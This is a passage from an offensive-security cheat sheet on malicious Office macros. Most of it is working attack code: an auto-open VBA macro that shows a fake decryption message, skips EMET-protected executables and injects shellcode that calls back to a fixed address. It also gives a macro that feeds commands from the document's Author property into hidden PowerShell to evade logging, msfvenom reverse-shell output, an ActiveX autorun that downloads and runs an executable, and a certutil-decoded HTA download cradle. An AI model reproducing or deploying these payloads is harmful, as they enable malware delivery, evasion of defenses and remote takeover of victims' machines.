Private Declare Function rarecandy Lib "kernel32" Alias "IsWow64Process" (ByVal hProcess As Long, ByRef Wow64Process As Boolean) As Boolean
Private Declare Function dragonascent Lib "kernel32" Alias "CreateProcessA" (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
Private Type SYSTEM_INFO
wProcessorArchitecture As Integer
wReserved As Integer
dwPageSize As Long
lpMinimumApplicationAddress As Long
lpMaximumApplicationAddress As Long
dwActiveProcessorMask As Long
dwNumberOrfProcessors As Long
dwProcessorType As Long
dwAllocationGranularity As Long
dwReserved As Long
End Type
#End If
Dim inject64 As Boolean
Public Function IsOffice64Bit() As Boolean
Dim lpSystemInfo As SYSTEM_INFO
Call pokedex(lpSystemInfo)
If lpSystemInfo.wProcessorArchitecture = PROCESSOR_ARCHITECTURE_AMD64 Then
Call rarecandy(cosmicpower(), IsOffice64Bit)
IsOffice64Bit = Not IsOffice64Bit
End If
End Function
Public Function IsWow64(handle As Long) As Boolean
Call rarecandy(handle, meh)
IsWow64 = Not meh
End Function
Public Function DieTotal()
MsgBox "This document will begin decrypting, please allow up to 5 minutes"
End Function
Public Function TrailingSlash(strFolder As String) As String
If Len(strFolder) > 0 Then
If Right(strFolder, 1) = "\" Then
TrailingSlash = strFolder
Else
TrailingSlash = strFolder & "\"
End If
End If
End Function
Public Function RecursiveDir(colFiles As Collection, strFolder As String, strFileSpec As String, bIncludeSubfolders As Boolean)
Dim strTemp As String
Dim colFolders As New Collection
Dim vFolderName As Variant
strFolder = TrailingSlash(strFolder)
On Error Resume Next
strTemp = Dir(strFolder & strFileSpec)
Do While strTemp <> vbNullString
colFiles.Add strFolder & strTemp
strTemp = Dir
Loop
If bIncludeSubfolders Then
strTemp = Dir(strFolder, vbDirectory)
Do While strTemp <> vbNullString
If (strTemp <> ".") And (strTemp <> "..") Then
If (GetAttr(strFolder & strTemp) And vbDirectory) <> 0 Then
colFolders.Add strTemp
End If
End If
strTemp = Dir
Loop
For Each vFolderName In colFolders
Call RecursiveDir(colFiles, strFolder & vFolderName, strFileSpec, True)
Next vFolderName
End If
End Function
Public Function getList() As String()
Dim myList As String
myList = ""
myList = myList & "ping.exe /t 127.0.0.1" & ","
myList = myList & "C:\Program Files (x86)\EMET 5.5\EMET_Agent.exe" & ","
myList = myList & "hh.exe /?" & ","
myList = myList & "regedit.exe" & ","
myList = myList & "cmd.exe /K" & ","
myList = myList & "xpsrchvw.exe" & ","
myList = myList & "xcopy.exe * /w" & ","
myList = myList & "wscript.exe" & ","
myList = myList & "netstat.exe -aneft 100" & ","
myList = myList & "netsh.exe" & ","
myList = myList & "winver.exe" & ","
myList = myList & "windowsanytimeupgradeui.exe" & ","
myList = myList & "wfs.exe" & ","
myList = myList & "waitfor.exe statusready" & ","
myList = myList & "verifier.exe" & ","
myList = myList & "timeout.exe -1" & ","
myList = myList & "soundrecorder.exe" & ","
myList = myList & "sndvol.exe" & ","
myList = myList & "rasphone.exe" & ","
myList = myList & "nslookup.exe" & ","
myList = myList & "mstsc.exe" & ","
myList = myList & "wmic.exe" & ","
myList = myList & "C:\\windows\\system32\\speech\\speechux\\speechuxtutorial.exe" & ","
myList = myList & "C:\Windows\SysWOW64\Ping.exe -t 127.0.0.1" & ","
myList = myList & "wmic.exe" & ","
myList = myList & "C:\Windows\bfsvc.exe" & ","
myList = myList & "C:\Windows\explorer.exe" & ","
myList = myList & "C:\Windows\fveupdate.exe" & ","
myList = myList & "C:\Windows\HelpPane.exe" & ","
' Cut for brevity
[...]
myList = myList & "C:\Windows\System32\wbem\wbemtest.exe" & ","
myList = myList & "C:\Windows\System32\wbem\WinMgmt.exe" & ","
myList = myList & "C:\Windows\System32\wbem\WMIADAP.exe" & ","
myList = myList & "C:\Windows\System32\wbem\WmiApSrv.exe" & ","
myList = myList & "C:\Windows\System32\wbem\WMIC.exe" & ","
myList = myList & "C:\Windows\System32\wbem\WmiPrvSE.exe" & ","
myList = myList & "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" & ","
myList = myList & "C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe" & ","
myList = myList & "C:\Windows\SysWOW64\AdapterTroubleshooter.exe" & ","
myList = myList & "C:\Windows\SysWOW64\ARP.EXE" & ","
myList = myList & "C:\Windows\SysWOW64\at.exe" & ","
myList = myList & "C:\Windows\SysWOW64\AtBroker.exe" & ","
myList = myList & "C:\Windows\SysWOW64\attrib.exe" & ","
myList = myList & "C:\Windows\SysWOW64\auditpol.exe" & ","
myList = myList & "C:\Windows\SysWOW64\autochk.exe" & ","
' Cut for brevity
[...]
myList = myList & "C:\Windows\SysWOW64\InstallShield\setup.exe" & ","
myList = myList & "C:\Windows\SysWOW64\InstallShield\_isdel.exe" & ","
myList = myList & "C:\Windows\SysWOW64\migwiz\mighost.exe" & ","
myList = myList & "C:\Windows\SysWOW64\migwiz\MigSetup.exe" & ","
myList = myList & "C:\Windows\SysWOW64\migwiz\migwiz.exe" & ","
myList = myList & "C:\Windows\SysWOW64\migwiz\PostMig.exe" & ","
myList = myList & "C:\Windows\SysWOW64\wbem\mofcomp.exe" & ","
myList = myList & "C:\Windows\SysWOW64\wbem\WinMgmt.exe" & ","
myList = myList & "C:\Windows\SysWOW64\wbem\WMIADAP.exe" & ","
myList = myList & "C:\Windows\SysWOW64\wbem\WMIC.exe" & ","
myList = myList & "C:\Windows\SysWOW64\wbem\WmiPrvSE.exe" & ","
myList = myList & "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" & ","
myList = myList & "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe" & ","
myArray = Split(myList, ",")
Dim c As Integer
Dim list() As String
For c = LBound(myArray) To (UBound(myArray) - 1)
ReDim Preserve list(c)
list(c) = myArray(c)
Next
c = UBound(list)
Dim colFiles As New Collection
RecursiveDir colFiles, "C:\Program Files", "*.exe", True
RecursiveDir colFiles, "C:\Program Files (x86)", "*.exe", True
RecursiveDir colFiles, "C:\Intel", "*.exe", True
RecursiveDir colFiles, "C:\Windows\Syswow64", "*.exe", True
RecursiveDir colFiles, "C:\Windows\System32", "*.exe", True
RecursiveDir colFiles, "C:\Windows\winsxs", "*.exe", True
RecursiveDir colFiles, "C:\Windows\System32\DriverStore\FileRepository", "*.exe", True
RecursiveDir colFiles, "C:\Windows\Microsoft.NET\assembly\GAC_MSIL\Microsoft.Workflow.Compiler\", "*.exe", True
RecursiveDir colFiles, "C:\Windows\Microsoft.NET\Framework\", "*.exe", True
Dim vFile As Variant
For Each vFile In colFiles
ReDim Preserve list(c)
list(c) = vFile
c = c + 1
Next vFile
getList = list
End Function
Public Function pathOf(program As String) As String
pathOf = ""
If program Like "*.exe" Then
program = program
Else
program = program & ".exe"
End If
If program Like "*:\*" Then
pathOf = program
Exit Function
Else
paths = Environ("PATH")
Dim allPaths() As String
allPaths = Split(paths, ";")
Dim Path As Variant
For Each Path In allPaths
' With more complex env variables - esp complex path set - need to do some tidying or quote errors
If Right(Path, 1) = Chr(34) Then 'Check if string ends with a quote
    ms = Mid(Path, 2, Len(Path) - 2) & "\" & program
Else
    ms = Path & "\" & program
End If
If Not Dir(ms, vbDirectory) = vbNullString Then
pathOf = ms
Exit Function
End If
Next
End If
End Function
Public Function getEMET() As String()
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & "." & "\root\default:StdRegProv")
oReg.EnumValues HKEY_LOCAL_MACHINE, "SOFTWARE\Microsoft\EMET\AppSettings", arrValues, arrTypes
Dim smack() As String
Dim count As Integer
If IsArray(arrValues) Then
    For count = LBound(arrValues) To UBound(arrValues)
    ReDim Preserve smack(count)
    smack(count) = arrValues(count)
    Next
Else
    ReDim Preserve smack(0)
    smack(0) = ""
End If
getEMET = smack
End Function
Public Function AutoPwn() As Long
myArray = FightEMET
Dim Count As Integer
Dim Success As Integer
For Count = LBound(myArray) To UBound(myArray)
Dim proc As String
proc = myArray(Count)
Success = Inject(proc)
If Success = 1 Then Exit For
Next
End Function
Public Function FightEMET() As String()
myArray = getList
smex = getEMET
Dim count As Integer
Dim sCount As Integer
Dim kCount As Integer
kCount = 0
Dim killedEMET() As String
For count = LBound(myArray) To UBound(myArray)
progo = myArray(count)
prog = Split(progo, ".exe")
kk = Replace(prog(0), "\\", "\")
Dim gg As String
gg = kk
pathKK = Replace(pathOf(Replace(gg, """", "")), "\\", "\")
Dim fudgeBool As Boolean
fudgeBool = False
    If Not smex(0) = "" Then
        For sCount = LBound(smex) To UBound(smex)
            If LCase(pathKK) Like LCase(smex(sCount)) Then
                fudgeBool = True
            End If
        Next
    End If
    If fudgeBool = False Then
            ReDim Preserve killedEMET(kCount)
            killedEMET(kCount) = myArray(count)
            kCount = kCount + 1
    End If
Next
FightEMET = killedEMET
End Function
Public Function Inject(processCmd As String) As Long
Dim myByte As Long, buf As Variant, myCount As Long, hProcess As Long
#If VBA7 Then
    Dim lLinkToLibary As LongPtr, rekt As LongPtr, hThread As LongPtr
#Else
    Dim lLinkToLibary As Long, rekt As Long, hThread As Long
#End If
Dim pInfo As PROCESS_INFORMATION
Dim sInfo As STARTUPINFO
Dim sNull As String
Dim sProc As String
sInfo.dwFlags = 1
If IsOffice64Bit Then
On Error Resume Next
sProc = processCmd
res = dragonascent(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)
hProcess = pInfo.hProcess
Dim b64 As Boolean
b64 = False
b64 = IsWow64(hProcess)
inject64 = True
If b64 = True Then
If inject64 = True Then
If hProcess = 0 Then
Exit Function
End If
lLinkToLibrary = watergun(hProcess, 0&, &H2be, &H3000, PAGE_READWRITE)
If lLinkToLibrary = 0 Then
sly = bodyslam(hProcess, lol)
Exit Function
End If      
Position = lLinkToLibrary
buf = Array(72,131,228,240,232,204,0,0,0,65,81,65,80,82,81,86,72,49,210,101,72,139,82,96,72,139,82,24,72,139,82,32,72,139,114,80,72,15,183,74,74,77,49,201,72,49,192,172,60,97,124,2,44,32,65,193,201,13,65,1,193,226,237,82,65,81,72,139,82,32,139,66,60,72,1,208,102,129,120,24,11,2,15,133,114,0,0,0,139,128,136,0,0,0,72,133,192,116,103,72,1, _
208,80,139,72,24,68,139,64,32,73,1,208,227,86,72,255,201,65,139,52,136,72,1,214,77,49,201,72,49,192,172,65,193,201,13,65,1,193,56,224,117,241,76,3,76,36,8,69,57,209,117,216,88,68,139,64,36,73,1,208,102,65,139,12,72,68,139,64,28,73,1,208,65,139,4,136,72,1,208,65,88,65,88,94,89,90,65,88,65,89,65,90,72,131,236,32,65,82,255,224, _
88,65,89,90,72,139,18,233,75,255,255,255,93,72,49,219,83,73,190,119,105,110,105,110,101,116,0,65,86,72,137,225,73,199,194,76,119,38,7,255,213,83,83,72,137,225,83,90,77,49,192,77,49,201,83,83,73,186,58,86,121,167,0,0,0,0,255,213,232,15,0,0,0,49,57,50,46,49,54,56,46,53,54,46,49,48,49,0,90,72,137,193,73,199,192,187,1,0,0,77, _
49,201,83,83,106,3,83,73,186,87,137,159,198,0,0,0,0,255,213,232,121,0,0,0,47,72,97,53,67,82,111,71,82,69,107,50,89,104,112,109,69,119,82,112,74,106,119,90,50,102,57,50,104,111,75,119,97,113,54,83,108,45,56,104,66,76,112,57,72,116,101,114,76,54,114,86,99,56,74,112,77,85,113,100,75,106,95,77,80,85,100,99,49,105,82,106,71,56,88,117, _
103,57,69,95,53,101,98,121,52,65,65,108,99,119,73,81,73,89,51,74,99,54,98,102,73,101,105,84,115,55,104,104,49,89,99,107,99,118,115,108,50,52,111,70,0,72,137,193,83,90,65,88,77,49,201,83,72,184,0,50,160,132,0,0,0,0,80,83,83,73,199,194,235,85,46,59,255,213,72,137,198,106,10,95,72,137,241,106,31,90,82,104,128,51,0,0,73,137,224,106, _
4,65,89,73,186,117,70,158,134,0,0,0,0,255,213,72,137,241,83,90,77,49,192,77,49,201,83,83,73,199,194,45,6,24,123,255,213,133,192,117,31,72,199,193,136,19,0,0,73,186,68,240,53,224,0,0,0,0,255,213,72,255,207,116,2,235,173,232,86,0,0,0,83,89,106,64,90,73,137,209,193,226,16,73,199,192,0,16,0,0,73,186,88,164,83,229,0,0,0,0, _
255,213,72,147,83,83,72,137,231,72,137,241,72,137,218,73,199,192,0,32,0,0,73,137,249,73,186,18,150,137,226,0,0,0,0,255,213,72,131,196,32,133,192,116,178,102,139,7,72,1,195,133,192,117,210,88,88,195,88,106,0,89,73,199,194,240,181,162,86,255,213)
For myCount = LBound(buf) To UBound(buf)
myByte = buf(myCount)
rekt = thunderbolt(hProcess, ByVal (lLinkToLibrary + myCount), myByte, 1, b)
Next myCount
hThread = flamethrower(hProcess, 0&, 0&, ByVal lLinkToLibrary, 0, 0, ByVal 0&)
End If
If hThread = 0 or Inject64 = False Then
If lLinkToLibrary <> 0 Then
leechseed hProcess, lLinkToLibrary, 0, MEM_RELEASE
End If
hProcess = pInfo.hProcess
sly = bodyslam(hProcess, lol)
Exit Function
Else
Inject = 1 'Success
End If
Else
If hProcess = 0 Then
Exit Function
End If
lLinkToLibrary = watergun(hProcess, 0&, &H1b5, &H3000, PAGE_READWRITE)
If lLinkToLibrary = 0 Then
sly = bodyslam(hProcess, lol)
Exit Function
End If
Position = lLinkToLibrary
buf = Array(232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20,139,114,40,15,183,74,38,49,255,172,60,97,124,2,44,32,193,207,13,1,199,226,242,82,87,139,82,16,139,74,60,139,76,17,120,227,72,1,209,81,139,89,32,1,211,139,73,24,227,58,73,139,52,139,1,214,49,255,172,193,207,13,1,199,56,224,117,246,3,125,248,59,125,36,117,228,88,139,88,36,1, _
211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,95,95,90,139,18,235,141,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,255,213,49,219,83,83,83,83,83,104,58,86,121,167,255,213,83,83,106,3,83,83,104,187,1,0,0,232,192,0,0,0,47,85,55,69,102,86,99,88,70,120,72,104,116,122,87,122,77, _
78,70,71,57,76,103,105,122,109,118,108,72,79,115,56,77,119,111,66,55,100,78,84,79,103,108,76,66,99,65,89,0,80,104,87,137,159,198,255,213,137,198,83,104,0,50,224,132,83,83,83,87,83,86,104,235,85,46,59,255,213,150,106,10,95,104,128,51,0,0,137,224,106,4,80,106,31,86,104,117,70,158,134,255,213,83,83,83,83,86,104,45,6,24,123,255,213,133,192,117, _
20,104,136,19,0,0,104,68,240,53,224,255,213,79,117,205,232,75,0,0,0,106,64,104,0,16,0,0,104,0,0,64,0,83,104,88,164,83,229,255,213,147,83,83,137,231,87,104,0,32,0,0,83,86,104,18,150,137,226,255,213,133,192,116,207,139,7,1,195,133,192,117,229,88,195,95,232,107,255,255,255,49,57,50,46,49,54,56,46,53,54,46,49,48,49,0,187,240,181,162, _
86,106,0,83,255,213)
For myCount = LBound(buf) To UBound(buf)
myByte = buf(myCount)
rekt = thunderbolt(hProcess, ByVal (lLinkToLibrary + myCount), myByte, 1, b)
Next myCount
hThread = flamethrower(hProcess, 0&, 0&, ByVal lLinkToLibrary, 0, 0, ByVal 0&)
If hThread = 0 Then
If lLinkToLibrary <> 0 Then
leechseed hProcess, lLinkToLibrary, 0, MEM_RELEASE
End If
hProcess = pInfo.hProcess
sly = bodyslam(hProcess, lol)
Exit Function
Else
Inject = 1 'Success
End If
End If
Else
sProc = processCmd
res = dragonascent(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)
hProcess = pInfo.hProcess
If hProcess = 0 Then
Exit Function
End If
lLinkToLibrary = watergun(hProcess, 0&, &H1b5, &H3000, PAGE_READWRITE)
If lLinkToLibrary = 0 Then
sly = bodyslam(hProcess, lol)
Exit Function
End If         
Position = lLinkToLibrary
buf = Array(232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20,139,114,40,15,183,74,38,49,255,172,60,97,124,2,44,32,193,207,13,1,199,226,242,82,87,139,82,16,139,74,60,139,76,17,120,227,72,1,209,81,139,89,32,1,211,139,73,24,227,58,73,139,52,139,1,214,49,255,172,193,207,13,1,199,56,224,117,246,3,125,248,59,125,36,117,228,88,139,88,36,1, _
211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,95,95,90,139,18,235,141,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,255,213,49,219,83,83,83,83,83,104,58,86,121,167,255,213,83,83,106,3,83,83,104,187,1,0,0,232,192,0,0,0,47,85,55,69,102,86,99,88,70,120,72,104,116,122,87,122,77, _
78,70,71,57,76,103,105,122,109,118,108,72,79,115,56,77,119,111,66,55,100,78,84,79,103,108,76,66,99,65,89,0,80,104,87,137,159,198,255,213,137,198,83,104,0,50,224,132,83,83,83,87,83,86,104,235,85,46,59,255,213,150,106,10,95,104,128,51,0,0,137,224,106,4,80,106,31,86,104,117,70,158,134,255,213,83,83,83,83,86,104,45,6,24,123,255,213,133,192,117, _
20,104,136,19,0,0,104,68,240,53,224,255,213,79,117,205,232,75,0,0,0,106,64,104,0,16,0,0,104,0,0,64,0,83,104,88,164,83,229,255,213,147,83,83,137,231,87,104,0,32,0,0,83,86,104,18,150,137,226,255,213,133,192,116,207,139,7,1,195,133,192,117,229,88,195,95,232,107,255,255,255,49,57,50,46,49,54,56,46,53,54,46,49,48,49,0,187,240,181,162, _
86,106,0,83,255,213)
For myCount = LBound(buf) To UBound(buf)
myByte = buf(myCount)
rekt = thunderbolt(hProcess, ByVal (lLinkToLibrary + myCount), myByte, 1, b)
Next myCount
hThread = flamethrower(hProcess, 0&, 0&, ByVal lLinkToLibrary, 0, 0, ByVal 0&)
If hThread = 0 Then
If lLinkToLibrary <> 0 Then
leechseed hProcess, lLinkToLibrary, 0, MEM_RELEASE
End If
hProcess = pInfo.hProcess
sly = bodyslam(hProcess, lol)
Exit Function
Else
Inject = 1 'Success
End If
End If
End Function
Sub AutoOpen()
DieTotal
AutoPwn
End Sub
Sub Workbook_Open()
DieTotal
AutoPwn
End Sub

```

---

**8. Custom macro taking commands from *Author property* to feed them to `StdIn` of Powershell**

In this scenario, we set up a Macro that will take it's commands from Author property (or any other) and then pass it to *StdIn* of *Powershell* interpreter to avoid command logging in Event Logs of Windows:

**Step #1:**
Put the following macro (or modify it in some way)

```
Private Sub Workbook_Open()
    Dim author As String
    author = ActiveWorkbook.BuiltinDocumentProperties("Author")
    
    Dim ws As Object
    Set ws = CreateObject("WScript.Shell")
    
    With ws.Exec("powershell.exe -nop -WindowStyle hidden -Command -")
        .StdIn.WriteLine author
        .StdIn.WriteBlankLines 1
        .Terminate
    End With
End Sub
```

Then place some not Base64 encoded Powershell commands in Author property of document's. Macro could be easily generated for instance using **msfvenom**:

```
work|19:10|~ # msfvenom -f psh-cmd LHOST=192.168.56.101 LPORT=4444
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 333 bytes
Final size of psh-cmd file: 6151 bytes
%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGkAcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAUwB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQBtAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9ACcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAcgBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAJwBIADQAcwBJAEEATABmAFgAWgBGAG8AQwBBADcAVgBXAGIAWQAvAGEATwBCAEQAKwB2 ...
```

Then we take that commands, base64-decode them and put into Author property. That's all.

---

**9. ActiveX-based (`InkPicture` control, `Painted` event) autorun macro**

One can also go to *Developer tab on ribbon -> Insert -> More Controls -> Microsoft InkPicture Control*
Then add such a control and double-click on it. This will pop up macro edit window, where one could put one of the above stated macros, or similar to the one below:

```
Private Sub InkPicture1_Painted(ByVal hDC As Long, ByVal Rect As MSINKAUTLib.IInkRectangle)
Run = Shell("cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile('https://<host>/file.exe','file.exe');Start-Process 'file.exe'", vbNormalFocus)
End Sub
```

For other Macro-autorun related ActiveX controls and their methods - one can refer to the below resource:
http://www.greyhathacker.net/?p=948

ActiveX Control | Subroutine name
--- | ---
Microsoft Forms 2.0 Frame | Frame1_Layout
Microsoft Forms 2.0 MultiPage | MultiPage1_Layout
Microsoft ImageComboBox Control, ver6.0 | ImageCombo21_Change
Microsoft InkEdit Control | InkEdit1_GotFocus
. | InkPicture1_Painted
Microsoft InkPicture Control | InkPicture1_Painting
. | InkPicture1_Resize
System Monitor Control | SystemMonitor1_GotFocus
. | SystemMonitor1_LostFocus
Microsoft Web Browser | WebBrowser1_BeforeNavigate2
. | many others...


---

**10. Generate Base64-encoded HTA application to be decoded using `certutil`**

In this scenario, we are going to generate a file (like HTA application - which has relatively low detection rate by AVs and HIPSes) - then download it via *Powershell*-based Download Cradle, then pass it to `certutil` to make it Base64 decode that file and launch what has been decoded.

**Step #1: Generate proper CRT file**

To do this, we can use below script (modification is required to make `msfvenom` return proper payload):
```
#!/bin/bash

# --- PAYLOAD SETUP

LHOST=192.168.56.101
LPORT=4444
PAYLOAD=windows/meterpreter/reverse_tcp

# This file must have *.crt extension
OUTPUT_FILE=/var/www/html/encoded.crt

PAYLOAD_FILE=/tmp/test$RANDOM

# ----

msfvenom -f hta-psh -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -o $PAYLOAD_FILE

echo -----BEGIN CERTIFICATE----- > $OUTPUT_FILE
cat $PAYLOAD_FILE | base64 -w 0 >> $OUTPUT_FILE
echo -----END CERTIFICATE----- >> $OUTPUT_FILE

chown www-data:www-data $OUTPUT_FILE 2> /dev/null

echo "Generated file: $OUTPUT_FILE"
```

Then, having such file placed on our HTTP server - we are going to prepare Download-Cradle macro:

```
Sub DownloadAndExec()

Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
xHttp.Open "GET", "https://<attacker>/encoded.crt", False
xHttp.Send

With bStrm
    .Type = 1
    .Open
    .write xHttp.responseBody
    .savetofile "encoded.crt", 2
End With

Shell ("cmd /c certutil -decode encoded.crt encoded.hta & start encoded.hta")

End Sub
```